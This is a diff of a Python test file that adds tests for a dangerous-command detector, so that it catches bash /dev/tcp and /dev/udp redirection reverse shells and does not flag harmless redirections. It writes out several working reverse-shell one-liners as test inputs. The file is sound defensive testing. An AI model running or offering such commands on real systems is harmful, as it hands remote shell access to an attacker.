@@ -209,6 +209,88 @@ class TestDetectReverseShellFlags:
         assert is_dangerous is False
 
 
+class TestDetectReverseShellRedirection:
+    """Bash `/dev/tcp` redirection-style reverse shells (#17873, fr33d3m0n review).
+
+    `bash -i >& /dev/tcp/<host>/<port> 0>&1` and its FD-redirection variants
+    spawn a shell whose stdio is wired to a TCP socket without using
+    `-e` / `EXEC:` / `bash -c`, so the netcat / socat / shell-bootstrap rules
+    don't catch them. The pattern keys on the redirection target rather than
+    the shell name so all four variants in the issue are covered.
+    """
+
+    def test_bash_redirect_to_dev_tcp_detected(self):
+        is_dangerous, _, desc = detect_dangerous_command(
+            "bash -i >& /dev/tcp/host/4444 0>&1"
+        )
+        assert is_dangerous is True
+        assert "reverse shell" in desc.lower() or "/dev/tcp" in desc.lower()
+
+    def test_bash_absolute_path_redirect_to_dev_tcp_detected(self):
+        is_dangerous, _, _ = detect_dangerous_command(
+            "/bin/bash -i >& /dev/tcp/host/9001 0>&1"
+        )
+        assert is_dangerous is True
+
+    def test_bash_redirect_no_space_to_dev_tcp_detected(self):
+        # `>&/dev/tcp/...` with no whitespace between `>&` and the target.
+        is_dangerous, _, _ = detect_dangerous_command(
+            "bash -i >&/dev/tcp/host/4444 0>&1"
+        )
+        assert is_dangerous is True
+
+    def test_bash_numeric_fd_redirect_detected(self):
+        # `5<>/dev/tcp/...` — explicit FD redirection variant.
+        is_dangerous, _, _ = detect_dangerous_command(
+            "bash -i 5<>/dev/tcp/host/4444 0<&5 1>&5 2>&5"
+        )
+        assert is_dangerous is True
+
+    def test_exec_fd_to_dev_tcp_detected(self):
+        # `exec 196<>/dev/tcp/...` raw form, no shell name on the cmdline.
+        is_dangerous, _, _ = detect_dangerous_command(
+            "exec 196<>/dev/tcp/host/4444; sh <&196 >&196"
+        )
+        assert is_dangerous is True
+
+    def test_dev_udp_variant_detected(self):
+        # The `/dev/udp/` sibling pseudo-device behaves the same way for
+        # connectionless reverse-shell variants.
+        is_dangerous, _, _ = detect_dangerous_command(
+            "bash -i >& /dev/udp/host/4444 0>&1"
+        )
+        assert is_dangerous is True
+
+    def test_grep_for_dev_tcp_string_safe(self):
+        # Searching logs for the `/dev/tcp/` string is benign — there's no
+        # `[<>]` anchor immediately before the path.
+        is_dangerous, _, _ = detect_dangerous_command(
+            "grep '/dev/tcp/' /var/log/audit.log"
+        )
+        assert is_dangerous is False
+
+    def test_redirect_to_devnull_safe(self):
+        # `cmd > /dev/null` is the most common benign redirection — no
+        # `/dev/(tcp|udp)/` in the target, so no match.
+        is_dangerous, _, _ = detect_dangerous_command(
+            "echo hello > /dev/null"
+        )
+        assert is_dangerous is False
+
+    def test_read_dev_sda_safe(self):
+        # `ls /dev/sda` has no redirection operator before the path.
+        is_dangerous, _, _ = detect_dangerous_command("ls /dev/sda")
+        assert is_dangerous is False
+
+    def test_stderr_to_stdout_safe(self):
+        # `2>&1` is the canonical stderr-to-stdout redirection — no
+        # `/dev/(tcp|udp)/` follows the `&1`, so no match.
+        is_dangerous, _, _ = detect_dangerous_command(
+            "make build 2>&1 | tee build.log"
+        )
+        assert is_dangerous is False
+
+
 class TestDetectDownloadExecute:
     """Two-stage download-then-execute (#17873).
 
